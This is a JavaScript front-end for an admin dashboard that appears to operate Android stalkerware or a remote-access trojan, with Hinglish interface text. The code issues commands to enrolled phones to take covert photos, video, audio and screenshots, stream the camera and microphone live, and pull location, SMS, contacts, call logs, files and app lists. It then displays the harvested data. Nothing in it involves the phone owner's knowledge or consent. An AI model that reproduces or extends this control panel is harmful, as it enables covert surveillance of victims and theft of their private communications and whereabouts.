const SERVER_URL = window.location.origin;
let currentTab = 'devices';
let allData = {};
let socket;

// ============ LOGIN ============
function login() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  fetch(SERVER_URL + '/api/admin/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  })
  .then(r => r.json())
  .then(data => {
    if (data.success) {
      localStorage.setItem('csk4_token', data.token);
      showDashboard();
    } else {
      document.getElementById('loginError').textContent = '❌ Galat credentials';
    }
  })
  .catch(() => document.getElementById('loginError').textContent = '❌ Server error');
}

function logout() {
  localStorage.removeItem('csk4_token');
  location.reload();
}

function showDashboard() {
  document.getElementById('loginScreen').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  loadData();
  setInterval(loadData, 8000);
  socket = io();
  socket.emit('register-admin');
  ['device-update','new-location','new-file','contacts-update','nearby-update',
   'messages-update','calllogs-update','apps-update','info-update',
   'bluetooth-update'].forEach(ev => socket.on(ev, () => loadData()));
}

if (localStorage.getItem('csk4_token')) showDashboard();

document.getElementById('password').addEventListener('keypress', e => {
  if (e.key === 'Enter') login();
});

// ============ LOAD ============
function loadData() {
  fetch(SERVER_URL + '/api/admin/data')
    .then(r => r.json())
    .then(data => {
      allData = data;
      renderStats(data.stats || {});
      renderTab(currentTab);
    })
    .catch(err => console.error(err));
}

function renderStats(s) {
  document.getElementById('statsGrid').innerHTML = `
    <div class="stat-card"><div class="stat-value">${s.totalDevices||0}</div><div class="stat-label">Devices</div></div>
    <div class="stat-card"><div class="stat-value">${s.onlineDevices||0}</div><div class="stat-label">Online</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalPhotos||0}</div><div class="stat-label">Photos</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalVideos||0}</div><div class="stat-label">Videos</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalScreenshots||0}</div><div class="stat-label">Screenshots</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalContacts||0}</div><div class="stat-label">Contacts</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalMessages||0}</div><div class="stat-label">SMS</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalBluetooth||0}</div><div class="stat-label">Bluetooth</div></div>
  `;
}

// ============ TABS ============
function showTab(tab, event) {
  currentTab = tab;
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  if (event) event.target.classList.add('active');
  renderTab(tab);
}

function renderTab(tab) {
  const el = document.getElementById('tabContent');
  const r = {
    devices: renderDevices, live: renderLive, locations: renderLocations,
    contacts: renderContacts, messages: renderMessages, calllogs: renderCallLogs,
    photos: renderPhotos, videos: renderVideos, screenshots: renderScreenshots,
    audio: renderAudio, files: renderFiles, apps: renderApps,
    bluetooth: renderBluetooth, nearby: renderNearby, info: renderInfo,
    commands: renderCommands
  };
  el.innerHTML = (r[tab] || (() => '<div class="loading">Soon</div>'))();
}

// ============ DEVICES ============
function renderDevices() {
  const list = Object.values(allData.devices || {});
  if (list.length === 0) return '<div class="loading">Koi device registered nahi</div>';

  let html = `
    <div class="command-bar">
      <select id="cmdDevice">
        <option value="">-- Device --</option>
        ${list.map(d => `<option value="${d.deviceId}">${d.deviceName}</option>`).join('')}
      </select>
      <select id="cmdType">
        <optgroup label="📸 Capture">
          <option value="take_photo_back">📷 Photo (Back)</option>
          <option value="take_photo_front">🤳 Photo (Front)</option>
          <option value="record_video_back">🎥 Video 10s (Back)</option>
          <option value="record_video_front">🎥 Video 10s (Front)</option>
          <option value="record_audio">🎤 Audio 10s</option>
          <option value="screenshot">📸 Screenshot</option>
        </optgroup>
        <optgroup label="📊 Data">
          <option value="get_location">📍 Location</option>
          <option value="get_contacts">👥 Contacts</option>
          <option value="get_messages">💬 SMS</option>
          <option value="get_calllogs">📞 Call Logs</option>
          <option value="get_files">📁 Files</option>
          <option value="get_apps">📲 Apps</option>
          <option value="get_bluetooth">📶 Bluetooth</option>
          <option value="get_nearby">📡 Nearby</option>
          <option value="get_info">ℹ️ Info</option>
        </optgroup>
        <optgroup label="🎮 Control">
          <option value="vibrate">📳 Vibrate</option>
          <option value="play_sound">🔊 Play Sound</option>
          <option value="flashlight_on">🔦 Flash ON</option>
          <option value="flashlight_off">💡 Flash OFF</option>
          <option value="lock_screen">🔒 Lock</option>
        </optgroup>
        <optgroup label="🔴 Live">
          <option value="start_webrtc">🔴 Start Camera Stream</option>
          <option value="start_audio_stream">🎤 Start Audio Stream</option>
          <option value="stop_webrtc">⏹️ Stop Stream</option>
          <option value="switch_camera">🔄 Switch Camera</option>
        </optgroup>
      </select>
      <button onclick="sendCommand()">🚀 Send</button>
      <button onclick="clearCommands()" style="background:#7f1d1d">🗑️</button>
    </div>
  `;

  list.forEach(d => {
    const online = d.online ? 'online' : 'offline';
    html += `
      <div class="device-card">
        <div>
          <div class="device-name">📱 ${d.deviceName}</div>
          <div class="device-id">🆔 ${d.deviceId}</div>
          <div class="device-id">🔋 ${d.battery||0}% | ⏰ ${new Date(d.lastSeen).toLocaleString()}</div>
        </div>
        <div>
          <span class="badge ${online}">${online}</span>
          <button class="btn-action" onclick="quickLive('${d.deviceId}')" style="background:#dc2626">🔴 Live</button>
          <button class="btn-action btn-danger" onclick="deleteDevice('${d.deviceId}')">🗑️</button>
        </div>
      </div>
    `;
  });
  return html;
}

function quickLive(deviceId) {
  currentTab = 'live';
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  const liveTab = document.querySelector('.tab[data-tab="live"]');
  if (liveTab) liveTab.classList.add('active');
  renderTab('live');
  setTimeout(() => {
    const sel = document.getElementById('liveDevice');
    if (sel) sel.value = deviceId;
    startLiveStream(deviceId, 'camera');
  }, 200);
}

// ============ LIVE ============
function renderLive() {
  const list = Object.values(allData.devices || {});
  return `
    <div class="live-container">
      <div class="live-header">
        <select id="liveDevice">
          <option value="">-- Device Select --</option>
          ${list.map(d => `<option value="${d.deviceId}">${d.deviceName}</option>`).join('')}
        </select>
        <button onclick="startLiveStream(document.getElementById('liveDevice').value, 'camera')" style="background:#dc2626">🔴 Camera Live</button>
        <button onclick="startLiveStream(document.getElementById('liveDevice').value, 'audio')" style="background:#7c3aed">🎤 Audio Live</button>
        <button onclick="switchCamera()" style="background:#0891b2">🔄 Switch</button>
        <button onclick="stopLiveStream()" style="background:#374151">⏹️ Stop</button>
      </div>
      <div class="live-video-wrap">
        <video id="liveVideo" autoplay playsinline controls muted></video>
        <div id="liveStatus" class="live-status">Not streaming</div>
      </div>
      <audio id="liveAudio" autoplay controls style="width:100%;margin-top:12px"></audio>
    </div>
  `;
}

// ============ RENDERERS ============
function renderLocations() {
  const list = (allData.locations || []).slice().reverse().slice(0, 100);
  if (!list.length) return '<div class="loading">Koi location nahi</div>';
  return list.map(l => `
    <div class="item-card">
      <div>
        <div class="device-id">${l.deviceId}</div>
        <div style="color:#4f8cff;font-weight:600;margin:4px 0">📍 ${l.lat.toFixed(6)}, ${l.lng.toFixed(6)}</div>
        <div class="device-id">🎯 ${l.accuracy?Math.round(l.accuracy)+'m':'N/A'} | ⏰ ${new Date(l.time).toLocaleString()}</div>
      </div>
      <a href="https://maps.google.com/?q=${l.lat},${l.lng}" target="_blank" class="btn-action">🗺️</a>
    </div>
  `).join('');
}

function renderContacts() {
  const list = allData.contacts || [];
  if (!list.length) return '<div class="loading">Koi contact nahi</div>';
  return list.map(c => `
    <div class="item-card">
      <div>
        <div class="device-name">👤 ${esc(c.name)}</div>
        <div class="device-id">📞 ${c.phone}</div>
      </div>
      <a href="tel:${c.phone}" class="btn-action">📞</a>
    </div>
  `).join('');
}

function renderMessages() {
  const list = (allData.messages || []).slice().reverse().slice(0, 200);
  if (!list.length) return '<div class="loading">Koi SMS nahi</div>';
  return list.map(m => `
    <div class="item-card" style="flex-direction:column;align-items:flex-start">
      <div class="device-name">💬 ${esc(m.from)}</div>
      <div style="color:#8b9ab5;margin:6px 0">${esc(m.body)}</div>
      <div class="device-id">${new Date(parseInt(m.time)||m.time).toLocaleString()}</div>
    </div>
  `).join('');
}

function renderCallLogs() {
  const list = (allData.callLogs || []).slice(0, 200);
  if (!list.length) return '<div class="loading">Koi call nahi</div>';
  const types = {1:'📥',2:'📤',3:'❌',4:'📮',5:'🚫',6:'⏱️'};
  return list.map(c => `
    <div class="item-card">
      <div>
        <div class="device-name">${types[c.type]||'📞'} ${esc(c.name)}</div>
        <div class="device-id">${c.number} | ⏱️ ${c.duration}s</div>
        <div class="device-id">${new Date(parseInt(c.time)).toLocaleString()}</div>
      </div>
    </div>
  `).join('');
}

function renderPhotos() {
  const list = (allData.photos || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi photo nahi</div>';
  return '<div class="photos-grid">' + list.map(p => `
    <a href="${p.url}" target="_blank"><img src="${p.url}"></a>
  `).join('') + '</div>';
}

function renderVideos() {
  const list = (allData.videos || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi video nahi</div>';
  return list.map(v => `
    <div class="item-card" style="flex-direction:column;align-items:flex-start">
      <div class="device-name">🎥 ${v.originalName}</div>
      <div class="device-id">${(v.size/1024/1024).toFixed(2)} MB</div>
      <video controls style="width:100%;max-width:400px;margin-top:8px"><source src="${v.url}"></video>
    </div>
  `).join('');
}

function renderScreenshots() {
  const list = (allData.screenshots || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi screenshot nahi</div>';
  return '<div class="photos-grid">' + list.map(p => `
    <a href="${p.url}" target="_blank"><img src="${p.url}"></a>
  `).join('') + '</div>';
}

function renderAudio() {
  const list = (allData.audio || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi audio nahi</div>';
  return list.map(a => `
    <div class="item-card" style="flex-direction:column;align-items:flex-start">
      <div class="device-name">🎤 ${a.originalName}</div>
      <div class="device-id">${new Date(a.time).toLocaleString()}</div>
      <audio controls style="width:100%;margin-top:8px"><source src="${a.url}"></audio>
    </div>
  `).join('');
}

function renderFiles() {
  const list = (allData.files || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi file nahi</div>';
  return list.map(f => `
    <div class="item-card">
      <div>
        <div class="device-name">📄 ${f.originalName}</div>
        <div class="device-id">${(f.size/1024).toFixed(1)} KB</div>
      </div>
      <a href="${f.url}" target="_blank" class="btn-action">⬇️</a>
    </div>
  `).join('');
}

function renderApps() {
  const list = allData.apps || [];
  if (!list.length) return '<div class="loading">Apps command bhejein</div>';
  return list.map(a => `
    <div class="item-card">
      <div>
        <div class="device-name">📲 ${esc(a.name)}</div>
        <div class="device-id">${a.package}</div>
      </div>
    </div>
  `).join('');
}

function renderBluetooth() {
  const list = allData.bluetooth || [];
  if (!list.length) return '<div class="loading">Bluetooth command bhejein</div>';
  return list.map(d => `
    <div class="item-card">
      <div>
        <div class="device-name">📶 ${esc(d.name||'Unknown')}</div>
        <div class="device-id">${d.address} | ${d.type||''} | RSSI: ${d.rssi||'N/A'}</div>
      </div>
    </div>
  `).join('');
}

function renderNearby() {
  const list = allData.nearby || [];
  if (!list.length) return '<div class="loading">Koi nearby nahi</div>';
  return list.map(d => `
    <div class="item-card">
      <div class="device-name">📡 ${esc(d.name)}</div>
      <div class="device-id">${d.address} | ${d.type}</div>
    </div>
  `).join('');
}

function renderInfo() {
  const info = allData.deviceInfo || {};
  const keys = Object.keys(info);
  if (!keys.length) return '<div class="loading">Info command bhejein</div>';
  return keys.map(k => {
    const i = info[k];
    return `
      <div class="device-card"><div style="width:100%">
        <div class="device-name">📱 ${i.model||k}</div>
        <div class="device-id">Brand: ${i.brand} | Android: ${i.android} (SDK ${i.sdk})</div>
        <div class="device-id">CPU: ${i.cpu}</div>
        <div class="device-id">RAM: ${i.availableRAM}/${i.totalRAM} MB</div>
        <div class="device-id">Storage: ${i.availableStorage}/${i.totalStorage} MB</div>
      </div></div>
    `;
  }).join('');
}

function renderCommands() {
  const list = (allData.commands || []).slice().reverse().slice(0, 100);
  if (!list.length) return '<div class="loading">Koi command nahi</div>';
  return list.map(c => `
    <div class="item-card">
      <div>
        <div class="device-name">🎮 ${c.command}</div>
        <div class="device-id">${c.deviceId}</div>
        <div class="device-id">${new Date(c.time).toLocaleString()}</div>
        ${c.result ? `<div class="device-id">↳ ${c.result}</div>` : ''}
      </div>
      <span class="badge ${c.status==='done'?'online':'offline'}">${c.status}</span>
    </div>
  `).join('');
}

// ============ ACTIONS ============
function sendCommand() {
  const deviceId = document.getElementById('cmdDevice').value;
  const command = document.getElementById('cmdType').value;
  if (!deviceId) return alert('Device select karein');
  fetch(SERVER_URL + '/api/admin/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId, command })
  })
  .then(r => r.json())
  .then(d => {
    if (d.success) { toast('✅ ' + command); loadData(); }
    else toast('❌ ' + (d.error||'Fail'));
  })
  .catch(() => toast('❌ Fail'));
}

function deleteDevice(id) {
  if (!confirm('Remove?')) return;
  fetch(SERVER_URL + '/api/admin/device/' + id, { method: 'DELETE' }).then(() => loadData());
}

function clearCommands() {
  const id = document.getElementById('cmdDevice').value;
  if (!id) return alert('Device select karein');
  fetch(SERVER_URL + '/api/admin/clear-commands/' + id, { method: 'DELETE' }).then(() => loadData());
}

function esc(s) {
  if (s === null || s === undefined) return '';
  const d = document.createElement('div');
  d.textContent = String(s);
  return d.innerHTML;
}

function toast(m) {
  const t = document.createElement('div');
  t.style.cssText = 'position:fixed;top:20px;right:20px;background:#4f8cff;color:#fff;padding:12px 20px;border-radius:8px;z-index:9999;box-shadow:0 4px 12px rgba(0,0,0,0.3);font-size:14px';
  t.textContent = m;
  document.body.appendChild(t);
  setTimeout(() => t.remove(), 3000);
}